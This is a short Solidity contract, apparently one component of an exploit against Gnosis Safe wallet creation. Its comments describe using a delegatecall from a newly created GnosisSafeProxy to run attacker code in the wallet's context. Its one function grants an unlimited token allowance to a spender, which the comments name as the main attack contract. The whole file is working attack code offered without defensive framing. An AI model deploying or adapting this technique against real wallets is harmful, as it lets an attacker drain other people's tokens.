// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DelegateCallbackAttack {
    // this will be called by newly created GnosisSafeProxy using delegatecall()
    // this allows attacker to execute arbitrary code using GnosisSafeProxy context;
    // use this to approve token transfer for main attack contract

    function approve(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}